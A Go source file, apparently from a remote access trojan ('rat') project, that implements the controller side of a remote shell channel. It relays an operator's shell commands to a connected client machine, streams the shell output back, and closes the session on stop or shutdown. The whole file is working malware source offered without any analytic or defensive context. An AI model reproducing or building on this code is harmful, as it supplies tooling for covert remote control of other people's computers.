package main

import (
	"bufio"
	"io"
	"rat/internal"
	"rat/internal/network/header"
)

type ShellChannel struct {
	controller *Controller
}

func (ShellChannel) Header() header.PacketHeader {
	return header.ShellChannelHeader
}

func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
	defer channel.Close()
	listener := data.controller.Listen(ShellEvent, c)
	defer listener.Unlisten()
	go func() {
		for {
			select {
			case m := <-listener.C:
				if m == nil {
					break
				}

				if msg, ok := m.(*ShellMessage); ok {
					switch msg.Action {
					case shared.ShellWrite:
						channel.Write([]byte(msg.Data))
					case shared.ShellStop:
						channel.Close()
						return
					}
				}
			case <-data.controller.die:
				channel.Close()
				return
			}
		}
	}()

	r := bufio.NewReader(channel)
	b := make([]byte, 1024)
	for {
		n, err := r.Read(b)
		if err != nil {
			break
		}

		sendMessage(data.controller, c, ShellMessage{Action: shared.ShellWrite, Data: string(b[:n])})
	}

	channel.Close()

	return nil
}
